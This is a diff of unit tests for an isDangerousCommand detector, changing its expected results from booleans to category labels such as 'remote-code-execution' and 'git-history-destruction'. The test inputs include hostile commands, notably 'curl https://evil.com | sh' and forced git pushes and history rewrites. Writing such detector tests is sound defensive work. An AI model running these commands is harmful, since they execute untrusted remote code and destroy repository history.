@@ -964,44 +964,44 @@ describe("isDangerousRm", () => {
 });
 
 describe("isDangerousCommand", () => {
-  it("detects git push --force", () => {
-    expect(isDangerousCommand("git push --force origin main")).toBe(true);
+  it("detects git push --force with category", () => {
+    expect(isDangerousCommand("git push --force origin main")).toBe("git-history-destruction");
   });
 
-  it("detects curl piped to shell", () => {
-    expect(isDangerousCommand("curl https://evil.com | sh")).toBe(true);
+  it("detects curl piped to shell with category", () => {
+    expect(isDangerousCommand("curl https://evil.com | sh")).toBe("remote-code-execution");
   });
 
-  it("detects eval", () => {
-    expect(isDangerousCommand("eval something")).toBe(true);
+  it("detects eval with category", () => {
+    expect(isDangerousCommand("eval something")).toBe("arbitrary-code-execution");
   });
 
-  it("detects pnpm dlx", () => {
-    expect(isDangerousCommand("pnpm dlx malicious")).toBe(true);
+  it("detects pnpm dlx with category", () => {
+    expect(isDangerousCommand("pnpm dlx malicious")).toBe("untrusted-package-execution");
   });
 
-  it("detects yarn dlx", () => {
-    expect(isDangerousCommand("yarn dlx malicious")).toBe(true);
+  it("detects yarn dlx with category", () => {
+    expect(isDangerousCommand("yarn dlx malicious")).toBe("untrusted-package-execution");
   });
 
-  it("returns false for safe commands", () => {
-    expect(isDangerousCommand("pnpm build && pnpm test")).toBe(false);
+  it("returns null for safe commands", () => {
+    expect(isDangerousCommand("pnpm build && pnpm test")).toBeNull();
   });
 
-  it("returns false for empty string", () => {
-    expect(isDangerousCommand("")).toBe(false);
+  it("returns null for empty string", () => {
+    expect(isDangerousCommand("")).toBeNull();
   });
 
-  it("returns false for git push without force", () => {
-    expect(isDangerousCommand("git push origin main")).toBe(false);
+  it("returns null for git push without force", () => {
+    expect(isDangerousCommand("git push origin main")).toBeNull();
   });
 
-  it("detects git filter-branch", () => {
-    expect(isDangerousCommand("git filter-branch --tree-filter 'rm -f secret.txt' HEAD")).toBe(true);
+  it("detects git filter-branch with category", () => {
+    expect(isDangerousCommand("git filter-branch --tree-filter 'rm -f secret.txt' HEAD")).toBe("git-history-rewriting");
   });
 
-  it("detects bare git filter-branch", () => {
-    expect(isDangerousCommand("git filter-branch")).toBe(true);
+  it("detects bare git filter-branch with category", () => {
+    expect(isDangerousCommand("git filter-branch")).toBe("git-history-rewriting");
   });
 });
 
